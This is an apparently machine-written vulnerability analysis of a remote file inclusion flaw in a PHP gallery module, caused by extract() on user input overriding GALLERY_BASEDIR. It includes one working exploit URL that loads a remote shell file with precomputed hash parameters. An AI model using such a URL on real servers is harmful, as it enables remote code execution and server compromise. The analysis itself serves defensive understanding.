Based on the provided content, here's an analysis of the vulnerability:

**Root Cause of Vulnerability:**

The vulnerability stems from the insecure use of `extract()` function on user-supplied input (GET, POST, and COOKIE parameters) combined with a predictable directory path and the way the application includes files based on the user-provided `GALLERY_BASEDIR` variable.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The core vulnerability is a remote file inclusion. By manipulating the `GALLERY_BASEDIR` variable, an attacker can force the application to include a file from a remote server.
*   **Unsafe Use of `extract()`:** The code uses `extract($_GET)`, `extract($_POST)`, and `extract($_COOKIE)` which allows an attacker to inject arbitrary variables into the program's scope, overriding existing variables.
*   **Predictable Variable:** The application uses a predictable variable name, `GALLERY_BASEDIR`, to determine the location of files to include.
*   **Insufficient Input Sanitization:**  The application does not properly sanitize the `GALLERY_BASEDIR` variable before using it to include files.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious file from a remote server, an attacker can execute arbitrary code on the server hosting the vulnerable application.
*   **Complete System Compromise:** Successful code execution could lead to complete compromise of the vulnerable webserver and possibly the underlying system.

**Attack Vectors:**

*   **HTTP GET Parameter Manipulation:** The attacker injects the URL of a malicious script using the `GALLERY_BASEDIR` GET parameter.
*   **PHP Hash Calculation:** The exploit leverages the predictable PHP hash values of the `GALLERY_BASEDIR` variable, which are used in conjunction with the crafted URL, to successfully bypass some checks.
*   **Exploitation URL:** An example of a crafted URL would look like: `test.ru/xoopsgallery/init_basic.php?GALLERY_BASEDIR=http://path/to/m0nzt3r_shell.txt?&2093085906=1&995617320=2`

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the vulnerable server.
*   **Understanding of PHP and Web Technologies:** The attacker should understand how HTTP requests, PHP and file inclusion works.
*   **Ability to Host Malicious Files:** The attacker needs to be able to host a malicious file on a server accessible by the vulnerable application.

**Additional Notes:**

*   The provided exploit also mentions that the vulnerability works only when `register_globals` is off, highlighting a security configuration dependence.
*   The provided "security fix" is insufficient and easily bypassed by the attacker.
* The exploit code also mentions the use of `zend_hash_key_calc.exe` to determine the PHP4 and PHP5 hash values of `GALLERY_BASEDIR` which is necessary for a successful exploit.
